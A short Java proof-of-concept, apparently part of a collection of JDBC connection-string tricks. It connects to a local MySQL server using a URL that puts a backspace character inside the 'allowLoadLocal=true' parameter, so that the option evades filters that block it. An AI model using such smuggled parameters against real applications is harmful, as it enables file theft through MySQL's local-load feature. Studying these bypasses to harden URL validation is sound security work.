package com.jdbc.tricks.space_between;

import com.jdbc.tricks.utils.MysqlConnectionUtils;

/**
 * 其他空白字符绕过trick case
 */
public class AllowLoadLocal_OtherBetweenKeyValueBypass {
    public static void main(String[] args) {
        String url = "jdbc:mysql://127.0.0.1:3306/test?allowLoadLocal=\btrue";
        MysqlConnectionUtils.connect(url, "root", "root", true);
    }
}
